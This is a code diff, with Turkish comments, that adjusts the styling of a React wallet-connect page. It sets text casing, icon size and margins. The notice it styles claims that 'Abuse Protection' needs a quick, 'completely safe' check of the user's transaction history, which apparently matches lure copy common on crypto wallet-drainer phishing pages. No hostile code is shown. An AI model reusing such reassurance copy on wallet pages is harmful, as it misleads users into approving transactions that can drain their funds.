@@ -207,27 +207,26 @@ export default function WalletConnectPage() {
         fontSize: "0.95em",
         display: "inline-block",
         lineHeight: 1.4,
+        textTransform: "none"      // ← Burayı ekledik
       } as React.CSSProperties
     }
   >
     <wui-icon
       name="info"
       size="sm"
-      style={
-        {
-          "--local-width": "14px",
-          marginRight: "2px",
-          verticalAlign: "middle",
-        } as React.CSSProperties
-      }
+      style={{
+        "--local-width": "14px",
+        marginRight: "4px",
+        verticalAlign: "middle",
+      } as React.CSSProperties}
     >
       <svg
         xmlns="http://www.w3.org/2000/svg"
-        width="14"
-        height="14"
+        width="16"
+        height="16"
         viewBox="0 0 24 24"
         fill="none"
-        stroke="var(--wui-color-accent-100)"     /* ikon stroke rengi */
+        stroke="var(--wui-color-accent-100)"
         strokeWidth="2.2"
         strokeLinecap="round"
         strokeLinejoin="round"
@@ -246,6 +245,7 @@ export default function WalletConnectPage() {
         marginRight: "2px",
         display: "inline",
         fontSize: "0.95em",
+        textTransform: "none"      // başlığı da koru
       }}
     >
       Note:
@@ -255,9 +255,11 @@ export default function WalletConnectPage() {
         verticalAlign: "middle",
         display: "inline",
         fontSize: "0.95em",
+        textTransform: "none"      // açıklama metni de
       }}
     >
-            This dApp uses Abuse Protection to prevent misuse of platform. You'll need to complete a quick verification of your transaction history. It's completely safe and only takes a few seconds.    </span>
+      This dApp uses Abuse Protection to prevent misuse of platform. You'll need to complete a quick verification of your transaction history. It's completely safe and only takes a few seconds.
+    </span>
   </wui-text>
 </div>
 
